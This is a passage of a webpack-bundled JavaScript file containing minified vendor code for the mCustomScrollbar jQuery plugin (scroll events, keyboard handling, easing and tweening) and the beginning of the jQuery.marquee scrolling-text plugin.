                s = e(".mCSB_" + n.idx + "_scrollbar ." + d[12]);
              s.bind("mousedown." + i + " touchstart." + i + " pointerdown." + i + " MSPointerDown." + i, function (o) {
                c = !0, e(o.target).hasClass("mCSB_dragger") || (t = 1);
              }).bind("touchend." + i + " pointerup." + i + " MSPointerUp." + i, function () {
                c = !1;
              }).bind("click." + i, function (a) {
                if (t && (t = 0, e(a.target).hasClass(d[12]) || e(a.target).hasClass("mCSB_draggerRail"))) {
                  Q(o);
                  var i = e(this),
                    s = i.find(".mCSB_dragger");
                  if (i.parent(".mCSB_scrollTools_horizontal").length > 0) {
                    if (!n.overflowed[1]) return;
                    var c = "x",
                      u = a.pageX > s.offset().left ? -1 : 1,
                      f = Math.abs(r[0].offsetLeft) - u * (.9 * l.width());
                  } else {
                    if (!n.overflowed[0]) return;
                    var c = "y",
                      u = a.pageY > s.offset().top ? -1 : 1,
                      f = Math.abs(r[0].offsetTop) - u * (.9 * l.height());
                  }
                  G(o, f.toString(), {
                    dir: c,
                    scrollEasing: "mcsEaseInOut"
                  });
                }
              });
            },
            H = function H() {
              var t = e(this),
                o = t.data(a),
                n = o.opt,
                i = a + "_" + o.idx,
                r = e("#mCSB_" + o.idx + "_container"),
                l = r.parent();
              r.bind("focusin." + i, function () {
                var o = e(document.activeElement),
                  a = r.find(".mCustomScrollBox").length,
                  i = 0;
                o.is(n.advanced.autoScrollOnFocus) && (Q(t), clearTimeout(t[0]._focusTimeout), t[0]._focusTimer = a ? (i + 17) * a : 0, t[0]._focusTimeout = setTimeout(function () {
                  var e = [ae(o)[0], ae(o)[1]],
                    a = [r[0].offsetTop, r[0].offsetLeft],
                    s = [a[0] + e[0] >= 0 && a[0] + e[0] < l.height() - o.outerHeight(!1), a[1] + e[1] >= 0 && a[0] + e[1] < l.width() - o.outerWidth(!1)],
                    c = "yx" !== n.axis || s[0] || s[1] ? "all" : "none";
                  "x" === n.axis || s[0] || G(t, e[0].toString(), {
                    dir: "y",
                    scrollEasing: "mcsEaseInOut",
                    overwrite: c,
                    dur: i
                  }), "y" === n.axis || s[1] || G(t, e[1].toString(), {
                    dir: "x",
                    scrollEasing: "mcsEaseInOut",
                    overwrite: c,
                    dur: i
                  });
                }, t[0]._focusTimer));
              });
            },
            U = function U() {
              var t = e(this),
                o = t.data(a),
                n = a + "_" + o.idx,
                i = e("#mCSB_" + o.idx + "_container").parent();
              i.bind("scroll." + n, function () {
                0 === i.scrollTop() && 0 === i.scrollLeft() || e(".mCSB_" + o.idx + "_scrollbar").css("visibility", "hidden");
              });
            },
            F = function F() {
              var t = e(this),
                o = t.data(a),
                n = o.opt,
                i = o.sequential,
                r = a + "_" + o.idx,
                l = ".mCSB_" + o.idx + "_scrollbar",
                s = e(l + ">a");
              s.bind("contextmenu." + r, function (e) {
                e.preventDefault();
              }).bind("mousedown." + r + " touchstart." + r + " pointerdown." + r + " MSPointerDown." + r + " mouseup." + r + " touchend." + r + " pointerup." + r + " MSPointerUp." + r + " mouseout." + r + " pointerout." + r + " MSPointerOut." + r + " click." + r, function (a) {
                function r(e, o) {
                  i.scrollAmount = n.scrollButtons.scrollAmount, j(t, e, o);
                }
                if (a.preventDefault(), ee(a)) {
                  var l = e(this).attr("class");
                  switch (i.type = n.scrollButtons.scrollType, a.type) {
                    case "mousedown":
                    case "touchstart":
                    case "pointerdown":
                    case "MSPointerDown":
                      if ("stepped" === i.type) return;
                      c = !0, o.tweenRunning = !1, r("on", l);
                      break;
                    case "mouseup":
                    case "touchend":
                    case "pointerup":
                    case "MSPointerUp":
                    case "mouseout":
                    case "pointerout":
                    case "MSPointerOut":
                      if ("stepped" === i.type) return;
                      c = !1, i.dir && r("off", l);
                      break;
                    case "click":
                      if ("stepped" !== i.type || o.tweenRunning) return;
                      r("on", l);
                  }
                }
              });
            },
            q = function q() {
              function t(t) {
                function a(e, t) {
                  r.type = i.keyboard.scrollType, r.scrollAmount = i.keyboard.scrollAmount, "stepped" === r.type && n.tweenRunning || j(o, e, t);
                }
                switch (t.type) {
                  case "blur":
                    n.tweenRunning && r.dir && a("off", null);
                    break;
                  case "keydown":
                  case "keyup":
                    var l = t.keyCode ? t.keyCode : t.which,
                      s = "on";
                    if ("x" !== i.axis && (38 === l || 40 === l) || "y" !== i.axis && (37 === l || 39 === l)) {
                      if ((38 === l || 40 === l) && !n.overflowed[0] || (37 === l || 39 === l) && !n.overflowed[1]) return;
                      "keyup" === t.type && (s = "off"), e(document.activeElement).is(u) || (t.preventDefault(), t.stopImmediatePropagation(), a(s, l));
                    } else if (33 === l || 34 === l) {
                      if ((n.overflowed[0] || n.overflowed[1]) && (t.preventDefault(), t.stopImmediatePropagation()), "keyup" === t.type) {
                        Q(o);
                        var f = 34 === l ? -1 : 1;
                        if ("x" === i.axis || "yx" === i.axis && n.overflowed[1] && !n.overflowed[0]) var h = "x",
                          m = Math.abs(c[0].offsetLeft) - f * (.9 * d.width());else var h = "y",
                          m = Math.abs(c[0].offsetTop) - f * (.9 * d.height());
                        G(o, m.toString(), {
                          dir: h,
                          scrollEasing: "mcsEaseInOut"
                        });
                      }
                    } else if ((35 === l || 36 === l) && !e(document.activeElement).is(u) && ((n.overflowed[0] || n.overflowed[1]) && (t.preventDefault(), t.stopImmediatePropagation()), "keyup" === t.type)) {
                      if ("x" === i.axis || "yx" === i.axis && n.overflowed[1] && !n.overflowed[0]) var h = "x",
                        m = 35 === l ? Math.abs(d.width() - c.outerWidth(!1)) : 0;else var h = "y",
                        m = 35 === l ? Math.abs(d.height() - c.outerHeight(!1)) : 0;
                      G(o, m.toString(), {
                        dir: h,
                        scrollEasing: "mcsEaseInOut"
                      });
                    }
                }
              }
              var o = e(this),
                n = o.data(a),
                i = n.opt,
                r = n.sequential,
                l = a + "_" + n.idx,
                s = e("#mCSB_" + n.idx),
                c = e("#mCSB_" + n.idx + "_container"),
                d = c.parent(),
                u = "input,textarea,select,datalist,keygen,[contenteditable='true']",
                f = c.find("iframe"),
                h = ["blur." + l + " keydown." + l + " keyup." + l];
              f.length && f.each(function () {
                e(this).bind("load", function () {
                  A(this) && e(this.contentDocument || this.contentWindow.document).bind(h[0], function (e) {
                    t(e);
                  });
                });
              }), s.attr("tabindex", "0").bind(h[0], function (e) {
                t(e);
              });
            },
            j = function j(t, o, n, i, r) {
              function l(e) {
                u.snapAmount && (f.scrollAmount = u.snapAmount instanceof Array ? "x" === f.dir[0] ? u.snapAmount[1] : u.snapAmount[0] : u.snapAmount);
                var o = "stepped" !== f.type,
                  a = r ? r : e ? o ? p / 1.5 : g : 1e3 / 60,
                  n = e ? o ? 7.5 : 40 : 2.5,
                  s = [Math.abs(h[0].offsetTop), Math.abs(h[0].offsetLeft)],
                  d = [c.scrollRatio.y > 10 ? 10 : c.scrollRatio.y, c.scrollRatio.x > 10 ? 10 : c.scrollRatio.x],
                  m = "x" === f.dir[0] ? s[1] + f.dir[1] * (d[1] * n) : s[0] + f.dir[1] * (d[0] * n),
                  v = "x" === f.dir[0] ? s[1] + f.dir[1] * parseInt(f.scrollAmount) : s[0] + f.dir[1] * parseInt(f.scrollAmount),
                  x = "auto" !== f.scrollAmount ? v : m,
                  _ = i ? i : e ? o ? "mcsLinearOut" : "mcsEaseInOut" : "mcsLinear",
                  w = !!e;
                return e && 17 > a && (x = "x" === f.dir[0] ? s[1] : s[0]), G(t, x.toString(), {
                  dir: f.dir[0],
                  scrollEasing: _,
                  dur: a,
                  onComplete: w
                }), e ? void (f.dir = !1) : (clearTimeout(f.step), void (f.step = setTimeout(function () {
                  l();
                }, a)));
              }
              function s() {
                clearTimeout(f.step), $(f, "step"), Q(t);
              }
              var c = t.data(a),
                u = c.opt,
                f = c.sequential,
                h = e("#mCSB_" + c.idx + "_container"),
                m = "stepped" === f.type,
                p = u.scrollInertia < 26 ? 26 : u.scrollInertia,
                g = u.scrollInertia < 1 ? 17 : u.scrollInertia;
              switch (o) {
                case "on":
                  if (f.dir = [n === d[16] || n === d[15] || 39 === n || 37 === n ? "x" : "y", n === d[13] || n === d[15] || 38 === n || 37 === n ? -1 : 1], Q(t), oe(n) && "stepped" === f.type) return;
                  l(m);
                  break;
                case "off":
                  s(), (m || c.tweenRunning && f.dir) && l(!0);
              }
            },
            Y = function Y(t) {
              var o = e(this).data(a).opt,
                n = [];
              return "function" == typeof t && (t = t()), t instanceof Array ? n = t.length > 1 ? [t[0], t[1]] : "x" === o.axis ? [null, t[0]] : [t[0], null] : (n[0] = t.y ? t.y : t.x || "x" === o.axis ? null : t, n[1] = t.x ? t.x : t.y || "y" === o.axis ? null : t), "function" == typeof n[0] && (n[0] = n[0]()), "function" == typeof n[1] && (n[1] = n[1]()), n;
            },
            X = function X(t, o) {
              if (null != t && "undefined" != typeof t) {
                var n = e(this),
                  i = n.data(a),
                  r = i.opt,
                  l = e("#mCSB_" + i.idx + "_container"),
                  s = l.parent(),
                  c = _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(t);
                o || (o = "x" === r.axis ? "x" : "y");
                var d = "x" === o ? l.outerWidth(!1) - s.width() : l.outerHeight(!1) - s.height(),
                  f = "x" === o ? l[0].offsetLeft : l[0].offsetTop,
                  h = "x" === o ? "left" : "top";
                switch (c) {
                  case "function":
                    return t();
                  case "object":
                    var m = t.jquery ? t : e(t);
                    if (!m.length) return;
                    return "x" === o ? ae(m)[1] : ae(m)[0];
                  case "string":
                  case "number":
                    if (oe(t)) return Math.abs(t);
                    if (-1 !== t.indexOf("%")) return Math.abs(d * parseInt(t) / 100);
                    if (-1 !== t.indexOf("-=")) return Math.abs(f - parseInt(t.split("-=")[1]));
                    if (-1 !== t.indexOf("+=")) {
                      var p = f + parseInt(t.split("+=")[1]);
                      return p >= 0 ? 0 : Math.abs(p);
                    }
                    if (-1 !== t.indexOf("px") && oe(t.split("px")[0])) return Math.abs(t.split("px")[0]);
                    if ("top" === t || "left" === t) return 0;
                    if ("bottom" === t) return Math.abs(s.height() - l.outerHeight(!1));
                    if ("right" === t) return Math.abs(s.width() - l.outerWidth(!1));
                    if ("first" === t || "last" === t) {
                      var m = l.find(":" + t);
                      return "x" === o ? ae(m)[1] : ae(m)[0];
                    }
                    return e(t).length ? "x" === o ? ae(e(t))[1] : ae(e(t))[0] : (l.css(h, t), void u.update.call(null, n[0]));
                }
              }
            },
            N = function N(t) {
              function o() {
                return clearTimeout(f[0].autoUpdate), 0 === l.parents("html").length ? void (l = null) : void (f[0].autoUpdate = setTimeout(function () {
                  return c.advanced.updateOnSelectorChange && (s.poll.change.n = i(), s.poll.change.n !== s.poll.change.o) ? (s.poll.change.o = s.poll.change.n, void r(3)) : c.advanced.updateOnContentResize && (s.poll.size.n = l[0].scrollHeight + l[0].scrollWidth + f[0].offsetHeight + l[0].offsetHeight + l[0].offsetWidth, s.poll.size.n !== s.poll.size.o) ? (s.poll.size.o = s.poll.size.n, void r(1)) : !c.advanced.updateOnImageLoad || "auto" === c.advanced.updateOnImageLoad && "y" === c.axis || (s.poll.img.n = f.find("img").length, s.poll.img.n === s.poll.img.o) ? void ((c.advanced.updateOnSelectorChange || c.advanced.updateOnContentResize || c.advanced.updateOnImageLoad) && o()) : (s.poll.img.o = s.poll.img.n, void f.find("img").each(function () {
                    n(this);
                  }));
                }, c.advanced.autoUpdateTimeout));
              }
              function n(t) {
                function o(e, t) {
                  return function () {
                    return t.apply(e, arguments);
                  };
                }
                function a() {
                  this.onload = null, e(t).addClass(d[2]), r(2);
                }
                if (e(t).hasClass(d[2])) return void r();
                var n = new Image();
                n.onload = o(n, a), n.src = t.src;
              }
              function i() {
                c.advanced.updateOnSelectorChange === !0 && (c.advanced.updateOnSelectorChange = "*");
                var e = 0,
                  t = f.find(c.advanced.updateOnSelectorChange);
                return c.advanced.updateOnSelectorChange && t.length > 0 && t.each(function () {
                  e += this.offsetHeight + this.offsetWidth;
                }), e;
              }
              function r(e) {
                clearTimeout(f[0].autoUpdate), u.update.call(null, l[0], e);
              }
              var l = e(this),
                s = l.data(a),
                c = s.opt,
                f = e("#mCSB_" + s.idx + "_container");
              return t ? (clearTimeout(f[0].autoUpdate), void $(f[0], "autoUpdate")) : void o();
            },
            V = function V(e, t, o) {
              return Math.round(e / t) * t - o;
            },
            Q = function Q(t) {
              var o = t.data(a),
                n = e("#mCSB_" + o.idx + "_container,#mCSB_" + o.idx + "_container_wrapper,#mCSB_" + o.idx + "_dragger_vertical,#mCSB_" + o.idx + "_dragger_horizontal");
              n.each(function () {
                Z.call(this);
              });
            },
            G = function G(t, o, n) {
              function i(e) {
                return s && c.callbacks[e] && "function" == typeof c.callbacks[e];
              }
              function r() {
                return [c.callbacks.alwaysTriggerOffsets || w >= S[0] + y, c.callbacks.alwaysTriggerOffsets || -B >= w];
              }
              function l() {
                var e = [h[0].offsetTop, h[0].offsetLeft],
                  o = [x[0].offsetTop, x[0].offsetLeft],
                  a = [h.outerHeight(!1), h.outerWidth(!1)],
                  i = [f.height(), f.width()];
                t[0].mcs = {
                  content: h,
                  top: e[0],
                  left: e[1],
                  draggerTop: o[0],
                  draggerLeft: o[1],
                  topPct: Math.round(100 * Math.abs(e[0]) / (Math.abs(a[0]) - i[0])),
                  leftPct: Math.round(100 * Math.abs(e[1]) / (Math.abs(a[1]) - i[1])),
                  direction: n.dir
                };
              }
              var s = t.data(a),
                c = s.opt,
                d = {
                  trigger: "internal",
                  dir: "y",
                  scrollEasing: "mcsEaseOut",
                  drag: !1,
                  dur: c.scrollInertia,
                  overwrite: "all",
                  callbacks: !0,
                  onStart: !0,
                  onUpdate: !0,
                  onComplete: !0
                },
                n = e.extend(d, n),
                u = [n.dur, n.drag ? 0 : n.dur],
                f = e("#mCSB_" + s.idx),
                h = e("#mCSB_" + s.idx + "_container"),
                m = h.parent(),
                p = c.callbacks.onTotalScrollOffset ? Y.call(t, c.callbacks.onTotalScrollOffset) : [0, 0],
                g = c.callbacks.onTotalScrollBackOffset ? Y.call(t, c.callbacks.onTotalScrollBackOffset) : [0, 0];
              if (s.trigger = n.trigger, 0 === m.scrollTop() && 0 === m.scrollLeft() || (e(".mCSB_" + s.idx + "_scrollbar").css("visibility", "visible"), m.scrollTop(0).scrollLeft(0)), "_resetY" !== o || s.contentReset.y || (i("onOverflowYNone") && c.callbacks.onOverflowYNone.call(t[0]), s.contentReset.y = 1), "_resetX" !== o || s.contentReset.x || (i("onOverflowXNone") && c.callbacks.onOverflowXNone.call(t[0]), s.contentReset.x = 1), "_resetY" !== o && "_resetX" !== o) {
                if (!s.contentReset.y && t[0].mcs || !s.overflowed[0] || (i("onOverflowY") && c.callbacks.onOverflowY.call(t[0]), s.contentReset.x = null), !s.contentReset.x && t[0].mcs || !s.overflowed[1] || (i("onOverflowX") && c.callbacks.onOverflowX.call(t[0]), s.contentReset.x = null), c.snapAmount) {
                  var v = c.snapAmount instanceof Array ? "x" === n.dir ? c.snapAmount[1] : c.snapAmount[0] : c.snapAmount;
                  o = V(o, v, c.snapOffset);
                }
                switch (n.dir) {
                  case "x":
                    var x = e("#mCSB_" + s.idx + "_dragger_horizontal"),
                      _ = "left",
                      w = h[0].offsetLeft,
                      S = [f.width() - h.outerWidth(!1), x.parent().width() - x.width()],
                      b = [o, 0 === o ? 0 : o / s.scrollRatio.x],
                      y = p[1],
                      B = g[1],
                      T = y > 0 ? y / s.scrollRatio.x : 0,
                      k = B > 0 ? B / s.scrollRatio.x : 0;
                    break;
                  case "y":
                    var x = e("#mCSB_" + s.idx + "_dragger_vertical"),
                      _ = "top",
                      w = h[0].offsetTop,
                      S = [f.height() - h.outerHeight(!1), x.parent().height() - x.height()],
                      b = [o, 0 === o ? 0 : o / s.scrollRatio.y],
                      y = p[0],
                      B = g[0],
                      T = y > 0 ? y / s.scrollRatio.y : 0,
                      k = B > 0 ? B / s.scrollRatio.y : 0;
                }
                b[1] < 0 || 0 === b[0] && 0 === b[1] ? b = [0, 0] : b[1] >= S[1] ? b = [S[0], S[1]] : b[0] = -b[0], t[0].mcs || (l(), i("onInit") && c.callbacks.onInit.call(t[0])), clearTimeout(h[0].onCompleteTimeout), J(x[0], _, Math.round(b[1]), u[1], n.scrollEasing), !s.tweenRunning && (0 === w && b[0] >= 0 || w === S[0] && b[0] <= S[0]) || J(h[0], _, Math.round(b[0]), u[0], n.scrollEasing, n.overwrite, {
                  onStart: function onStart() {
                    n.callbacks && n.onStart && !s.tweenRunning && (i("onScrollStart") && (l(), c.callbacks.onScrollStart.call(t[0])), s.tweenRunning = !0, C(x), s.cbOffsets = r());
                  },
                  onUpdate: function onUpdate() {
                    n.callbacks && n.onUpdate && i("whileScrolling") && (l(), c.callbacks.whileScrolling.call(t[0]));
                  },
                  onComplete: function onComplete() {
                    if (n.callbacks && n.onComplete) {
                      "yx" === c.axis && clearTimeout(h[0].onCompleteTimeout);
                      var e = h[0].idleTimer || 0;
                      h[0].onCompleteTimeout = setTimeout(function () {
                        i("onScroll") && (l(), c.callbacks.onScroll.call(t[0])), i("onTotalScroll") && b[1] >= S[1] - T && s.cbOffsets[0] && (l(), c.callbacks.onTotalScroll.call(t[0])), i("onTotalScrollBack") && b[1] <= k && s.cbOffsets[1] && (l(), c.callbacks.onTotalScrollBack.call(t[0])), s.tweenRunning = !1, h[0].idleTimer = 0, C(x, "hide");
                      }, e);
                    }
                  }
                });
              }
            },
            J = function J(e, t, o, a, n, i, r) {
              function l() {
                S.stop || (x || m.call(), x = K() - v, s(), x >= S.time && (S.time = x > S.time ? x + f - (x - S.time) : x + f - 1, S.time < x + 1 && (S.time = x + 1)), S.time < a ? S.id = h(l) : g.call());
              }
              function s() {
                a > 0 ? (S.currVal = u(S.time, _, b, a, n), w[t] = Math.round(S.currVal) + "px") : w[t] = o + "px", p.call();
              }
              function c() {
                f = 1e3 / 60, S.time = x + f, h = window.requestAnimationFrame ? window.requestAnimationFrame : function (e) {
                  return s(), setTimeout(e, .01);
                }, S.id = h(l);
              }
              function d() {
                null != S.id && (window.requestAnimationFrame ? window.cancelAnimationFrame(S.id) : clearTimeout(S.id), S.id = null);
              }
              function u(e, t, o, a, n) {
                switch (n) {
                  case "linear":
                  case "mcsLinear":
                    return o * e / a + t;
                  case "mcsLinearOut":
                    return e /= a, e--, o * Math.sqrt(1 - e * e) + t;
                  case "easeInOutSmooth":
                    return e /= a / 2, 1 > e ? o / 2 * e * e + t : (e--, -o / 2 * (e * (e - 2) - 1) + t);
                  case "easeInOutStrong":
                    return e /= a / 2, 1 > e ? o / 2 * Math.pow(2, 10 * (e - 1)) + t : (e--, o / 2 * (-Math.pow(2, -10 * e) + 2) + t);
                  case "easeInOut":
                  case "mcsEaseInOut":
                    return e /= a / 2, 1 > e ? o / 2 * e * e * e + t : (e -= 2, o / 2 * (e * e * e + 2) + t);
                  case "easeOutSmooth":
                    return e /= a, e--, -o * (e * e * e * e - 1) + t;
                  case "easeOutStrong":
                    return o * (-Math.pow(2, -10 * e / a) + 1) + t;
                  case "easeOut":
                  case "mcsEaseOut":
                  default:
                    var i = (e /= a) * e,
                      r = i * e;
                    return t + o * (.499999999999997 * r * i + -2.5 * i * i + 5.5 * r + -6.5 * i + 4 * e);
                }
              }
              e._mTween || (e._mTween = {
                top: {},
                left: {}
              });
              var f,
                h,
                r = r || {},
                m = r.onStart || function () {},
                p = r.onUpdate || function () {},
                g = r.onComplete || function () {},
                v = K(),
                x = 0,
                _ = e.offsetTop,
                w = e.style,
                S = e._mTween[t];
              "left" === t && (_ = e.offsetLeft);
              var b = o - _;
              S.stop = 0, "none" !== i && d(), c();
            },
            K = function K() {
              return window.performance && window.performance.now ? window.performance.now() : window.performance && window.performance.webkitNow ? window.performance.webkitNow() : Date.now ? Date.now() : new Date().getTime();
            },
            Z = function Z() {
              var e = this;
              e._mTween || (e._mTween = {
                top: {},
                left: {}
              });
              for (var t = ["top", "left"], o = 0; o < t.length; o++) {
                var a = t[o];
                e._mTween[a].id && (window.requestAnimationFrame ? window.cancelAnimationFrame(e._mTween[a].id) : clearTimeout(e._mTween[a].id), e._mTween[a].id = null, e._mTween[a].stop = 1);
              }
            },
            $ = function $(e, t) {
              try {
                delete e[t];
              } catch (o) {
                e[t] = null;
              }
            },
            ee = function ee(e) {
              return !(e.which && 1 !== e.which);
            },
            te = function te(e) {
              var t = e.originalEvent.pointerType;
              return !(t && "touch" !== t && 2 !== t);
            },
            oe = function oe(e) {
              return !isNaN(parseFloat(e)) && isFinite(e);
            },
            ae = function ae(e) {
              var t = e.parents(".mCSB_container");
              return [e.offset().top - t.offset().top, e.offset().left - t.offset().left];
            },
            ne = function ne() {
              function e() {
                var e = ["webkit", "moz", "ms", "o"];
                if ("hidden" in document) return "hidden";
                for (var t = 0; t < e.length; t++) if (e[t] + "Hidden" in document) return e[t] + "Hidden";
                return null;
              }
              var t = e();
              return t ? document[t] : !1;
            };
          e.fn[o] = function (t) {
            return u[t] ? u[t].apply(this, Array.prototype.slice.call(arguments, 1)) : "object" != _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(t) && t ? void e.error("Method " + t + " does not exist") : u.init.apply(this, arguments);
          }, e[o] = function (t) {
            return u[t] ? u[t].apply(this, Array.prototype.slice.call(arguments, 1)) : "object" != _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(t) && t ? void e.error("Method " + t + " does not exist") : u.init.apply(this, arguments);
          }, e[o].defaults = i, window[o] = !0, e(window).bind("load", function () {
            e(n)[o](), e.extend(e.expr[":"], {
              mcsInView: e.expr[":"].mcsInView || function (t) {
                var o,
                  a,
                  n = e(t),
                  i = n.parents(".mCSB_container");
                if (i.length) return o = i.parent(), a = [i[0].offsetTop, i[0].offsetLeft], a[0] + ae(n)[0] >= 0 && a[0] + ae(n)[0] < o.height() - n.outerHeight(!1) && a[1] + ae(n)[1] >= 0 && a[1] + ae(n)[1] < o.width() - n.outerWidth(!1);
              },
              mcsInSight: e.expr[":"].mcsInSight || function (t, o, a) {
                var n,
                  i,
                  r,
                  l,
                  s = e(t),
                  c = s.parents(".mCSB_container"),
                  d = "exact" === a[3] ? [[1, 0], [1, 0]] : [[.9, .1], [.6, .4]];
                if (c.length) return n = [s.outerHeight(!1), s.outerWidth(!1)], r = [c[0].offsetTop + ae(s)[0], c[0].offsetLeft + ae(s)[1]], i = [c.parent()[0].offsetHeight, c.parent()[0].offsetWidth], l = [n[0] < i[0] ? d[0] : d[1], n[1] < i[1] ? d[0] : d[1]], r[0] - i[0] * l[0][0] < 0 && r[0] + n[0] - i[0] * l[0][1] >= 0 && r[1] - i[1] * l[1][0] < 0 && r[1] + n[1] - i[1] * l[1][1] >= 0;
              },
              mcsOverflow: e.expr[":"].mcsOverflow || function (t) {
                var o = e(t).data(a);
                if (o) return o.overflowed[0] || o.overflowed[1];
              }
            });
          });
        });
      });
      /* WEBPACK VAR INJECTION */
    }).call(this, __webpack_require__(/*! ./../../../node_modules/webpack/buildin/harmony-module.js */"./node_modules/webpack/buildin/harmony-module.js")(module));

    /***/
  }),
  /***/"./src/js/_vendor/_marquee.min.js": (
  /*!****************************************!*\
    !*** ./src/js/_vendor/_marquee.min.js ***!
    \****************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    /**
     * jQuery.marquee - scrolling text like old marquee element
     * @author Aamir Afridi - aamirafridi(at)gmail(dot)com / http://aamirafridi.com/jquery/jquery-marquee-plugin
     */
    (function (f) {
      f.fn.marquee = function (x) {
        return this.each(function () {
          var a = f.extend({}, f.fn.marquee.defaults, x),
            b = f(this),
            c,
            t,
            e = 3,
            y = "animation-play-state",
            p = !1,
            E = function E(a, b, c) {
              for (var e = ["webkit", "moz", "MS", "o", ""], d = 0; d < e.length; d++) e[d] || (b = b.toLowerCase()), a.addEventListener(e[d] + b, c, !1);
            },
            F = function F(a) {
              var b = [],
                c;
              for (c in a) a.hasOwnProperty(c) && b.push(c + ":" + a[c]);
              b.push();
              return "{" + b.join(",") + "}";
            },
            l = {
              pause: function pause() {
                p && a.allowCss3Support ? c.css(y, "paused") : f.fn.pause && c.pause();
                b.data("runningStatus", "paused");
                b.trigger("paused");
              },
              resume: function resume() {
                p && a.allowCss3Support ? c.css(y, "running") : f.fn.resume && c.resume();
                b.data("runningStatus", "resumed");
                b.trigger("resumed");
              },
              toggle: function toggle() {
                l["resumed" == b.data("runningStatus") ? "pause" : "resume"]();
              },
              destroy: function destroy() {
                clearTimeout(b.timer);
                b.find("*").addBack().unbind();
                b.html(b.find(".js-marquee:first").html());
              }
            };
          if ("string" === typeof x) f.isFunction(l[x]) && (c || (c = b.find(".js-marquee-wrapper")), !0 === b.data("css3AnimationIsSupported") && (p = !0), l[x]());else {
            var u;
            f.each(a, function (c, d) {
              u = b.attr("data-" + c);
              if ("undefined" !== typeof u) {
                switch (u) {
                  case "true":
                    u = !0;
                    break;
                  case "false":
                    u = !1;
                }
                a[c] = u;
              }
            });
            a.speed && (a.duration = parseInt(b.width(), 10) / a.speed * 1E3);
            var v = "up" == a.direction || "down" == a.direction;
            a.gap = a.duplicated ? parseInt(a.gap) : 0;
            b.wrapInner('<div class="js-marquee"></div>');
            var h = b.find(".js-marquee").css({
              "margin-right": a.gap,
              "float": "left"
            });
            a.duplicated && h.clone(!0).appendTo(b);
            b.wrapInner('<div style="width:100000px" class="js-marquee-wrapper"></div>');
            c = b.find(".js-marquee-wrapper");
            if (v) {
              var k = b.height();
              c.removeAttr("style");
              b.height(k);
              b.find(".js-marquee").css({
                "float": "none",
                "margin-bottom": a.gap,
                "margin-right": 0
              });
              a.duplicated && b.find(".js-marquee:last").css({
                "margin-bottom": 0
              });
              var q = b.find(".js-marquee:first").height() + a.gap;
              a.startVisible && !a.duplicated ? (a._completeDuration = (parseInt(q, 10) + parseInt(k, 10)) / parseInt(k, 10) * a.duration, a.duration *= parseInt(q, 10) / parseInt(k, 10)) : a.duration *= (parseInt(q, 10) + parseInt(k, 10)) / parseInt(k, 10);
            } else {
              var m = b.find(".js-marquee:first").width() + a.gap;
              var n = b.width();
              a.startVisible && !a.duplicated ? (a._completeDuration = (parseInt(m, 10) + parseInt(n, 10)) / parseInt(n, 10) * a.duration, a.duration *= parseInt(m, 10) / parseInt(n, 10)) : a.duration *= (parseInt(m, 10) + parseInt(n, 10)) / parseInt(n, 10);
            }
            a.duplicated && (a.duration /= 2);
            if (a.allowCss3Support) {
              h = document.body || document.createElement("div");
              var g = "marqueeAnimation-" + Math.floor(1E7 * Math.random()),
                A = ["Webkit", "Moz", "O", "ms", "Khtml"],
                B = "animation",
                d = "",
                r = "";
              h.style.animation && (r = "@keyframes " + g + " ", p = !0);
              if (!1 === p) for (var z = 0; z < A.length; z++) if (void 0 !== h.style[A[z] + "AnimationName"]) {
                h = "-" + A[z].toLowerCase() + "-";
                B = h + B;
                y = h + y;
                r = "@" + h + "keyframes " + g + " ";
                p = !0;
                break;
              }
              p && (d = g + " " + a.duration / 1E3 + "s " + a.delayBeforeStart / 1E3 + "s infinite " + a.css3easing, b.data("css3AnimationIsSupported", !0));
            }
            var C = function C() {
                c.css("transform", "translateY(" + ("up" == a.direction ? k + "px" : "-" + q + "px") + ")");
              },
              D = function D() {
                c.css("transform", "translateX(" + ("left" == a.direction ? n + "px" : "-" + m + "px") + ")");
              };
            a.duplicated ? (v ? a.startVisible ? c.css("transform", "translateY(0)") : c.css("transform", "translateY(" + ("up" == a.direction ? k + "px" : "-" + (2 * q - a.gap) + "px") + ")") : a.startVisible ? c.css("transform", "translateX(0)") : c.css("transform", "translateX(" + ("left" == a.direction ? n + "px" : "-" + (2 * m - a.gap) + "px") + ")"), a.startVisible || (e = 1)) : a.startVisible ? e = 2 : v ? C() : D();
            var w = function w() {
              a.duplicated && (1 === e ? (a._originalDuration = a.duration, a.duration = v ? "up" == a.direction ? a.duration + k / (q / a.duration) : 2 * a.duration : "left" == a.direction ? a.duration + n / (m / a.duration) : 2 * a.duration, d && (d = g + " " + a.duration / 1E3 + "s " + a.delayBeforeStart / 1E3 + "s " + a.css3easing), e++) : 2 === e && (a.duration = a._originalDuration, d && (g += "0", r = f.trim(r) + "0 ", d = g + " " + a.duration / 1E3 + "s 0s infinite " + a.css3easing), e++));
              v ? a.duplicated ? (2 < e && c.css("transform", "translateY(" + ("up" == a.direction ? 0 : "-" + q + "px") + ")"), t = {
                transform: "translateY(" + ("up" == a.direction ? "-" + q + "px" : 0) + ")"
              }) : a.startVisible ? 2 === e ? (d && (d = g + " " + a.duration / 1E3 + "s " + a.delayBeforeStart / 1E3 + "s " + a.css3easing), t = {
                transform: "translateY(" + ("up" == a.direction ? "-" + q + "px" : k + "px") + ")"
              }, e++) : 3 === e && (a.duration = a._completeDuration, d && (g += "0", r = f.trim(r) + "0 ", d = g + " " + a.duration / 1E3 + "s 0s infinite " + a.css3easing), C()) : (C(), t = {
                transform: "translateY(" + ("up" == a.direction ? "-" + c.height() + "px" : k + "px") + ")"
              }) : a.duplicated ? (2 < e && c.css("transform", "translateX(" + ("left" == a.direction ? 0 : "-" + m + "px") + ")"), t = {
                transform: "translateX(" + ("left" == a.direction ? "-" + m + "px" : 0) + ")"
              }) : a.startVisible ? 2 === e ? (d && (d = g + " " + a.duration / 1E3 + "s " + a.delayBeforeStart / 1E3 + "s " + a.css3easing), t = {
                transform: "translateX(" + ("left" == a.direction ? "-" + m + "px" : n + "px") + ")"
              }, e++) : 3 === e && (a.duration = a._completeDuration, d && (g += "0", r = f.trim(r) + "0 ", d = g + " " + a.duration / 1E3 + "s 0s infinite " + a.css3easing), D()) : (D(), t = {
                transform: "translateX(" + ("left" == a.direction ? "-" + m + "px" : n + "px") + ")"
              });
              b.trigger("beforeStarting");
              if (p) {
                c.css(B, d);
                var h = r + " { 100%  " + F(t) + "}",
                  l = c.find("style");
